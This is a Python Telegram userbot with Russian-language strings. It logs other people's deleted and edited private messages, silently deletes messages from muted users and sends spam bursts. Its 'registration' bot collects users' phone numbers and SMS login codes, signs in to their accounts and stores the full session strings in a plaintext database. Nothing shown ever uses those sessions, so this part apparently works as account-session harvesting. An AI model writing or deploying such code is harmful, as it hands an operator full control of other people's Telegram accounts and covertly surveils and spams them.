import asyncio
import sqlite3
import os
from datetime import datetime
from threading import Thread
from flask import Flask
from telethon import TelegramClient, events
from telethon.tl import types
from telethon.tl.types import PeerUser
from telethon.sessions import StringSession
from aiogram import Bot, Dispatcher, types as aiogram_types
from aiogram.contrib.middlewares.logging import LoggingMiddleware
import nest_asyncio

nest_asyncio.apply()

# ========== КОНФИГ ==========
API_ID = int(os.environ.get('API_ID'))
API_HASH = os.environ.get('API_HASH')
BOT_TOKEN = os.environ.get('BOT_TOKEN')
ADMIN_ID = int(os.environ.get('ADMIN_ID', 0))

# ========== БД ==========
conn = sqlite3.connect('userbot.db', check_same_thread=False)
cursor = conn.cursor()

cursor.execute('''CREATE TABLE IF NOT EXISTS messages (id INTEGER PRIMARY KEY, msg_id INTEGER, user_id INTEGER, chat_id INTEGER, text TEXT, date TEXT)''')
cursor.execute('''CREATE TABLE IF NOT EXISTS muted_users (user_id INTEGER PRIMARY KEY)''')
cursor.execute('''CREATE TABLE IF NOT EXISTS user_sessions (user_id INTEGER PRIMARY KEY, session_string TEXT)''')
conn.commit()

stored_messages = {}
owner_id = None
muted_users = set()

# ========== ТВОЙ ЮЗЕРБОТ ==========
user_client = TelegramClient('ub', API_ID, API_HASH)

# ========== БОТ ДЛЯ РЕГИСТРАЦИИ ==========
reg_bot = Bot(token=BOT_TOKEN)
dp = Dispatcher(reg_bot)
dp.middleware.setup(LoggingMiddleware())
temp_reg_data = {}

# ========== ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ ==========
async def get_user_info(user_id):
    try:
        user = await user_client.get_entity(user_id)
        username = user.username if user.username else ""
        name = f"{user.first_name or ''} {user.last_name or ''}".strip()
        return username, name, user
    except:
        return "", "Неизвестный пользователь", None

def send_bot_message_sync(text):
    try:
        import telebot
        telebot.TeleBot(BOT_TOKEN).send_message(owner_id, text, parse_mode='HTML', disable_web_page_preview=True)
    except Exception as e:
        print(f"Bot send error: {e}")

async def send_bot_message(text):
    loop = asyncio.get_event_loop()
    await loop.run_in_executor(None, send_bot_message_sync, text)

async def check_is_owner(event):
    return event.message.sender_id == owner_id

async def load_muted_users():
    cursor.execute('SELECT user_id FROM muted_users')
    rows = cursor.fetchall()
    global muted_users
    muted_users = {row[0] for row in rows}

async def get_owner_id():
    me = await user_client.get_me()
    return me.id

# ========== ОБРАБОТЧИКИ ДЛЯ ЮЗЕРБОТА ==========

@user_client.on(events.Raw(types.UpdateDeleteMessages))
async def raw_deleted_handler(event):
    try:
        for msg_id in event.messages:
            for (chat_id, stored_msg_id), text in list(stored_messages.items()):
                if stored_msg_id == msg_id:
                    cursor.execute('SELECT user_id FROM messages WHERE msg_id=? AND chat_id=?', (msg_id, chat_id))
                    row = cursor.fetchone()
                    if row:
                        user_id = row[0]
                        if user_id != owner_id:
                            username, name, user = await get_user_info(user_id)
                            link = f"https://t.me/{username}" if username else f"tg://user?id={user_id}"
                            message_text = f"🗑 Это сообщение было удалено\n\n<blockquote><a href=\"{link}\">{name}</a>\n{text}</blockquote>"
                            await send_bot_message(message_text)
                        cursor.execute('DELETE FROM messages WHERE msg_id=? AND chat_id=?', (msg_id, chat_id))
                        conn.commit()
                        stored_messages.pop((chat_id, stored_msg_id), None)
                        break
    except Exception as e:
        print(f"Raw delete error: {e}")

@user_client.on(events.Raw(types.UpdateEditMessage))
async def raw_edit_handler(event):
    try:
        if hasattr(event, 'message'):
            msg = event.message
            if hasattr(msg, 'peer_id') and isinstance(msg.peer_id, PeerUser):
                peer = msg.peer_id
                cursor.execute('SELECT user_id FROM messages WHERE msg_id=? AND chat_id=?', (msg.id, peer.user_id))
                row = cursor.fetchone()
                if row:
                    user_id = row[0]
                    if user_id != owner_id:
                        old_text = stored_messages.get((peer.user_id, msg.id), '')
                        new_text = msg.text or msg.message or ''
                        if new_text and new_text != old_text:
                            username, name, user = await get_user_info(user_id)
                            link = f"https://t.me/{username}" if username else f"tg://user?id={user_id}"
                            message_text = f"🔏 <a href=\"{link}\">{name}</a> изменил сообщение.\n\nСтарый текст:\n<blockquote>{old_text}</blockquote>\nНовый текст:\n<blockquote>{new_text}</blockquote>"
                            await send_bot_message(message_text)
                            cursor.execute('UPDATE messages SET text=? WHERE msg_id=? AND chat_id=?', (new_text, msg.id, peer.user_id))
                            conn.commit()
                            stored_messages[(peer.user_id, msg.id)] = new_text
    except Exception as e:
        print(f"Raw edit error: {e}")

@user_client.on(events.NewMessage(outgoing=True, pattern=r'^\.mute$'))
async def mute_handler(event):
    if not await check_is_owner(event):
        return
    try:
        reply_msg = await event.get_reply_message()
        if reply_msg and hasattr(reply_msg, 'sender_id') and reply_msg.sender_id:
            user_id = reply_msg.sender_id
            cursor.execute('SELECT user_id FROM muted_users WHERE user_id=?', (user_id,))
            if cursor.fetchone():
                await event.delete()
                return
            cursor.execute('INSERT OR IGNORE INTO muted_users (user_id) VALUES (?)', (user_id,))
            conn.commit()
            global muted_users
            muted_users.add(user_id)
            await event.edit('🔕 Помолчи.')
            print(f"Muted user {user_id}")
        else:
            await event.edit('💬 Использование: .mute (в ответ на сообщение)')
    except Exception as e:
        print(f"Mute error: {e}")

@user_client.on(events.NewMessage(outgoing=True, pattern=r'^\.unmute$'))
async def unmute_handler(event):
    if not await check_is_owner(event):
        return
    try:
        reply_msg = await event.get_reply_message()
        if reply_msg and hasattr(reply_msg, 'sender_id') and reply_msg.sender_id:
            user_id = reply_msg.sender_id
            cursor.execute('SELECT user_id FROM muted_users WHERE user_id=?', (user_id,))
            if not cursor.fetchone():
                await event.delete()
                return
            cursor.execute('DELETE FROM muted_users WHERE user_id=?', (user_id,))
            conn.commit()
            global muted_users
            muted_users.discard(user_id)
            await event.edit('🔔 Говори.')
            print(f"Unmuted user {user_id}")
        else:
            await event.edit('💬 Использование: .unmute (в ответ на сообщение)')
    except Exception as e:
        print(f"Unmute error: {e}")

@user_client.on(events.NewMessage(incoming=True))
async def incoming_message_handler(event):
    if isinstance(event.message.peer_id, PeerUser) and not event.message.out:
        try:
            sender_id = event.message.sender_id
            if not sender_id:
                return
            
            cursor.execute('SELECT user_id FROM muted_users WHERE user_id=?', (sender_id,))
            if cursor.fetchone():
                await event.delete()
                print(f"Deleted message from muted user {sender_id}")
                return
                
            text = event.message.text or event.message.message or ""
            cursor.execute('INSERT OR REPLACE INTO messages (msg_id, user_id, chat_id, text, date) VALUES (?, ?, ?, ?, ?)',
                          (event.message.id, sender_id, event.message.chat_id, text, datetime.now().isoformat()))
            conn.commit()
            stored_messages[(event.message.chat_id, event.message.id)] = text
        except Exception as e:
            print(f"Store error: {e}")

@user_client.on(events.NewMessage(outgoing=True, pattern=r'^\.type '))
async def type_handler(event):
    if not await check_is_owner(event):
        return
    try:
        text = event.message.text[6:]
        if not text:
            await event.edit('💬 Использование: .type [текст]')
            return
        await event.edit(".")
        typed = ""
        for char in text:
            typed += char
            try:
                await event.edit(typed)
            except:
                pass
            await asyncio.sleep(0.5)
    except Exception as e:
        print(f"Type error: {e}")

@user_client.on(events.NewMessage(outgoing=True, pattern=r'^\.spam '))
async def spam_handler(event):
    if not await check_is_owner(event):
        return
    try:
        parts = event.message.text.split(' ', 2)
        if len(parts) < 2:
            await event.edit('💬 Использование: .spam [кол-во] [текст или реплай]')
            return
        
        try:
            count = int(parts[1])
        except ValueError:
            await event.edit('💬 Использование: .spam [кол-во] [текст или реплай]')
            return
            
        if count > 20:
            count = 20
        reply_msg = await event.get_reply_message()
        
        if not reply_msg and len(parts) < 3:
            await event.edit('💬 Использование: .spam [кол-во] [текст или реплай]')
            return
            
        await event.delete()
        
        for i in range(count):
            if reply_msg:
                await user_client.send_message(event.chat_id, message=reply_msg)
            elif len(parts) > 2:
                await user_client.send_message(event.chat_id, parts[2])
            await asyncio.sleep(0.3)
    except Exception as e:
        print(f"Spam error: {e}")

@user_client.on(events.NewMessage(outgoing=True, pattern=r'^\.info$'))
async def info_handler(event):
    if not await check_is_owner(event):
        return
    try:
        reply_msg = await event.get_reply_message()
        if reply_msg and hasattr(reply_msg, 'sender_id') and reply_msg.sender_id:
            user_id = reply_msg.sender_id
            username, name, user = await get_user_info(user_id)
            username_display = f"@{username}" if username else "Нет"
            full_name = name if name else "Неизвестно"
            
            info_text = f"""<blockquote>Metadata:
├ 👤 ID: <b>{user_id}</b>
├ ✈️ Username: <b>{username_display}</b>
└ 👁 Full Name: <b>{full_name}</b></blockquote>"""
            
            await event.edit(info_text, parse_mode='HTML')
        else:
            await event.edit('Ответьте на сообщение!')
    except Exception as e:
        print(f"Info error: {e}")

@user_client.on(events.NewMessage(outgoing=True, pattern=r'^\.help( .*)?$'))
async def help_handler(event):
    if not await check_is_owner(event):
        return
    
    args = event.message.text.split(' ', 1)
    if len(args) > 1:
        command = args[1].strip()
        if command == 'type':
            await event.edit('⚙️ Typer\n\n· .type — Анимация печати текста: .type [text]')
        elif command == 'spam':
            await event.edit('⚙️ Spam\n\n· .spam — Спам сообщений: .spam [кол-во] [текст или реплай]')
        elif command == 'mute':
            await event.edit('⚙️ Mute\n\n· .mute — Заглушить пользователя: .mute (в ответ на сообщение)\n· .unmute — Разглушить пользователя: .unmute (в ответ на сообщение)')
        elif command == 'info':
            await event.edit('⚙️ UserInfo\n\n· .info — Информация о пользователе: .info (в ответ на сообщение)')
        else:
            help_text = """<b>📝 Команды</b>

<blockquote>▫️ Help: ( .help ) — Справка
▫️ Mute: ( .mute | .unmute ) — Помолчи
▫️ Spam: (.spam ) — Спам
▫️ Typer: ( .type ) — Набор текста
▫️ UserInfo: ( .info )</blockquote>

Справка по определенной команде: <code>.help [команда]</code>"""
            await event.edit(help_text, parse_mode='HTML')
    else:
        help_text = """<b>📝 Команды</b>

<blockquote>▫️ Help: ( .help ) — Справка
▫️ Mute: ( .mute | .unmute ) — Помолчи
▫️ Spam: (.spam ) — Спам
▫️ Typer: ( .type ) — Набор текста
▫️ UserInfo: ( .info )</blockquote>

Справка по определенной команде: <code>.help [команда]</code>"""
        await event.edit(help_text, parse_mode='HTML')

@user_client.on(events.NewMessage(outgoing=True))
async def outgoing_message_handler(event):
    if isinstance(event.message.peer_id, PeerUser):
        try:
            text = event.message.text or event.message.message or ""
            sender_id = event.message.sender_id
            if sender_id:
                cursor.execute('INSERT OR REPLACE INTO messages (msg_id, user_id, chat_id, text, date) VALUES (?, ?, ?, ?, ?)',
                              (event.message.id, sender_id, event.message.chat_id, text, datetime.now().isoformat()))
                conn.commit()
                stored_messages[(event.message.chat_id, event.message.id)] = text
        except Exception as e:
            print(f"Store outgoing error: {e}")

# ========== БОТ ДЛЯ РЕГИСТРАЦИИ ПОЛЬЗОВАТЕЛЕЙ ==========

@dp.message_handler(commands=['start'])
async def start_reg(message: aiogram_types.Message):
    user_id = message.from_user.id
    
    cursor.execute('SELECT session_string FROM user_sessions WHERE user_id=?', (user_id,))
    if cursor.fetchone():
        await message.answer("✅ Ты уже зарегистрирован!")
        return
    
    kb = aiogram_types.ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
    kb.add(aiogram_types.KeyboardButton("📱 Поделиться номером", request_contact=True))
    await message.answer("🔐 Отправь свой номер телефона для регистрации", reply_markup=kb)

@dp.message_handler(content_types=aiogram_types.ContentType.CONTACT)
async def get_phone(message: aiogram_types.Message):
    user_id = message.from_user.id
    phone = message.contact.phone_number
    
    try:
        client = TelegramClient(StringSession(), API_ID, API_HASH)
        await client.connect()
        result = await client.send_code_request(phone)
        temp_reg_data[user_id] = {"client": client, "phone": phone, "hash": result.phone_code_hash}
        await message.answer("📱 Введи код из SMS (5 цифр):", reply_markup=aiogram_types.ReplyKeyboardRemove())
    except Exception as e:
        await message.answer(f"❌ Ошибка: {e}")

@dp.message_handler(lambda msg: msg.text and msg.text.isdigit() and len(msg.text) == 5)
async def get_code(message: aiogram_types.Message):
    user_id = message.from_user.id
    code = message.text
    
    if user_id not in temp_reg_data:
        await message.answer("❌ Начни заново: /start")
        return
    
    data = temp_reg_data[user_id]
    
    try:
        await data["client"].sign_in(phone=data["phone"], code=code, phone_code_hash=data["hash"])
        session_str = data["client"].session.save()
        
        cursor.execute('INSERT OR REPLACE INTO user_sessions (user_id, session_string) VALUES (?, ?)', (user_id, session_str))
        conn.commit()
        
        await message.answer("✅ Регистрация успешна! Теперь ты можешь использовать юзербота.")
        
        if ADMIN_ID:
            await reg_bot.send_message(ADMIN_ID, f"🎉 Новый пользователь зарегистрирован!\nID: {user_id}\nUsername: @{message.from_user.username}")
        
        await data["client"].disconnect()
        del temp_reg_data[user_id]
    except Exception as e:
        await message.answer(f"❌ Ошибка авторизации: {e}")

# ========== ВЕБ-СЕРВЕР ДЛЯ RAILWAY ==========
flask_app = Flask(__name__)

@flask_app.route('/')
def health():
    return "UserBot Running!"

def run_web():
    flask_app.run(host='0.0.0.0', port=8080)

# ========== ЗАПУСК ==========
async def main():
    global owner_id
    await user_client.start()
    owner_id = await get_owner_id()
    await load_muted_users()
    print(f"✅ Юзербот запущен! User ID: {owner_id}")
    print(f"✅ Замученных пользователей: {len(muted_users)}")
    await user_client.run_until_disconnected()

def start_aiogram():
    from aiogram.utils import executor
    executor.start_polling(dp, skip_updates=True)

if __name__ == "__main__":
    Thread(target=run_web, daemon=True).start()
    Thread(target=start_aiogram, daemon=True).start()
    asyncio.run(main())
